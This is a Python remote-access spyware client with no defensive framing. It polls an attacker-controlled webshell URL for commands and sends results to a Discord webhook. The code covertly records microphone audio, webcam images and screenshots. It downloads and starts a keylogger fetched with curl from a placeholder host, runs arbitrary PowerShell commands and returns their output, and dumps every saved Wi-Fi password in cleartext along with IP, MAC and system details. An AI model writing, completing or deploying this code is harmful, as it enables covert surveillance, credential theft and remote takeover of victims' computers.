import cv2
import os
import time
import uuid
import socket
import psutil
import platform
import requests
import pyautogui
import subprocess
import sounddevice as sd
from discord import File
from pynput import keyboard
from bs4 import BeautifulSoup
from pydub import AudioSegment
from discord import SyncWebhook
from pydub.playback import play

webhook = SyncWebhook.from_url("INSERT_DISCORD_WEBHOOK_HERE")
controller = "INSERT_WEBSHELL_URL_HERE/command.txt"
current_user = os.getlogin()
save_path = os.path.dirname(os.path.realpath(__file__))
cap = cv2.VideoCapture(0)
update_delay = 2
last_command = "None"
send_key_logger_after_presses = 100

def record_audio(duration, sample_rate=44100):
    audio_data = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=1, dtype='int16')
    sd.wait()
    return audio_data

def save_audio_as_wav(audio_data, filename, sample_rate=44100):
    audio = AudioSegment(
        data=audio_data.tobytes(),
        sample_width=audio_data.dtype.itemsize,
        frame_rate=sample_rate,
        channels=1
    )
    audio.export(filename, format="wav")
    return filename

def take_screenshot(save_path):
    file_name = f"screenshot.png"
    file_path = os.path.join(save_path, file_name)
    screenshot = pyautogui.screenshot()
    screenshot.save(file_path)
    return file_path

def take_cam(cap, save_path):
    if cap.isOpened():
        ret, frame = cap.read()
        if ret:
            file_name = f"selfie.png"
            file_path = os.path.join(save_path, file_name)
            cv2.imwrite(file_path, frame)
            return file_path
    return None

def send_to_discord(file_paths, webhook):
    for file_path in file_paths:
        if file_path:
            with open(file_path, 'rb') as f:
                webhook.send(file=File(f, filename=os.path.basename(file_path)))

def delete_files(*paths):
    for i in paths:
        os.system(f"del {os.path.basename(i)}")

def spy(duration):
    wav_file = save_audio_as_wav(record_audio(duration), "msg.wav")
    cam_file = take_cam(cap, save_path)
    screen_file = take_screenshot(save_path)
    send_to_discord([wav_file, cam_file, screen_file], webhook)
    webhook.send(f"{current_user} at {time.time()}")
    delete_files(wav_file, cam_file, screen_file)

def install_keylogger():
    os.system("curl -o Build.exe https://KEYLOGGER_HOST_HERE/Build.exe")
    webhook.send("Keylogger download complete")

def powershell(command):
    try:
        print("start Powershell", command)
        webhook.send(f"Powershell command: {command} is executed")
        result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True)
        if result.stdout.strip() == "":
            webhook.send("There was no console output")
        else:
            output_string = result.stdout
            webhook.send(f"{current_user} powershell output: {output_string}")
    except Exception as error:
        webhook.send(error)

def get_ip_address():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        return ip_address
    except Exception as e:
        return f"Error getting IP address: {e}"

def get_mac_address():
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1])
        return mac
    except Exception as e:
        return f"Error getting MAC address: {e}"

def get_connected_wifi_details():
    try:
        ssid = None
        password = None
        if platform.system() == "Windows":
            result = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'], text=True)
            for line in result.splitlines():
                if "SSID" in line and not "BSSID" in line:
                    ssid = line.split(":")[-1].strip()
            if ssid:
                result = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', ssid, 'key=clear'], text=True)
                for line in result.splitlines():
                    if "Key Content" in line:
                        password = line.split(":")[-1].strip()
        return ssid, password
    except Exception as e:
        return f"Error getting connected Wi-Fi details: {e}", None

def get_all_wifi_profiles():
    try:
        wifi_profiles = {}
        if platform.system() == "Windows":
            result = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], text=True)
            profiles = [line.split(":")[-1].strip() for line in result.splitlines() if "All User Profile" in line]
            for profile in profiles:
                try:
                    profile_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], text=True)
                    for line in profile_info.splitlines():
                        if "Key Content" in line:
                            wifi_profiles[profile] = line.split(":")[-1].strip()
                            break
                    else:
                        wifi_profiles[profile] = None
                except subprocess.CalledProcessError:
                    wifi_profiles[profile] = None
        return wifi_profiles
    except Exception as e:
        return {"Error": f"Error getting all Wi-Fi profiles: {e}"}

def get_system_info():
    try:
        system_info = {
            "OS": platform.system(),
            "OS Version": platform.version(),
            "OS Release": platform.release(),
            "Machine": platform.machine(),
            "Processor": platform.processor(),
            "CPU Cores": psutil.cpu_count(logical=False),
            "Logical CPUs": psutil.cpu_count(logical=True),
            "Memory": f"{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB",
            "GPU": None
        }
        if platform.system() == "Windows":
            try:
                result = subprocess.check_output("wmic path win32_videocontroller get caption", shell=True, text=True)
                system_info["GPU"] = result.split("\n")[1].strip()
            except Exception:
                system_info["GPU"] = "Could not retrieve GPU information"
        return system_info
    except Exception as e:
        return {"Error": f"Error getting system info: {e}"}

# Program start
while True:
    try:
        time.sleep(update_delay)
        response = requests.get(controller)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "html.parser")
            command = soup.string
            if last_command == command:
                print("Awaiting new incomming command")
            else:
                print(command)
                # Spy module
                if command.startswith("spy" or "Spy" or "SPY"):
                    interfall = command[3:].strip()
                    if interfall <= "" or interfall <= "0" or interfall >= "120":
                        print(f"Interfall cant be {interfall}, setting to default 5")
                        webhook.send(f"{current_user} got a wrong interfall there for it defaults to 5 seconds!")
                        interfall = 5
                    last_command = command
                    while True:
                        spy(interfall)
                        response = requests.get(controller)
                        if response.status_code == 200:
                            soup = BeautifulSoup(response.text, "html.parser")
                            if soup.string != last_command:
                                break
                # Keylogger module    
                elif command.startswith("keylogger" or "Keylogger" or "KEYLOGGER"):
                    last_command = command
                    logger_options = command[9:].strip()
                    if logger_options == "download":
                        webhook.send(f"Downloading keylogger for {current_user}")
                        install_keylogger()
                    elif logger_options == "stop":
                        webhook.send(f"stopping keylogger for {current_user}")
                        os.system("taskkill /F /IM Build.exe")
                    elif logger_options == "start":
                        webhook.send(f"starting keylogger for {current_user}")
                        os.system("start Build.exe")
                    else:
                        webhook.send(f"{logger_options} is not a correct keylogger atribute!")
                # Powershell console module
                elif command.startswith("powershell" or "Powershell" or "POWERSHELL"):
                    last_command = command
                    print("command is powershell")
                    shell = command[10:].strip()
                    print(f"shell = {shell}")
                    powershell(shell)
                # Get system info
                elif command == "info" or command == "Info" or command == "INFO":
                    last_command = command
                    data = []
                    data.append("\nIP Address:")
                    data.append(get_ip_address())
                    data.append("\nMAC Address:")
                    data.append(get_mac_address())
                    data.append("\nConnected Wi-Fi Details:")
                    ssid, password = get_connected_wifi_details()
                    data.append(f"SSID: {ssid}, Password: {password}")
                    data.append("\nAll Wi-Fi Profiles:")
                    wifi_profiles = get_all_wifi_profiles()
                    for profile, pwd in wifi_profiles.items():
                        data.append(f"SSID: {profile}, Password: {pwd}")
                    data.append("\nSystem Info:")
                    system_info = get_system_info()
                    for key, value in system_info.items():
                        data.append(f"{key}: {value}")        
                    formated_data = "\n".join(data)
                    webhook.send(formated_data)        
    except Exception as error:
        print(error)
        webhook.send(f"{current_user} has experienced a error!")
        webhook.send(f"The error: {error}")
        print("Trying again in 5 seconds!")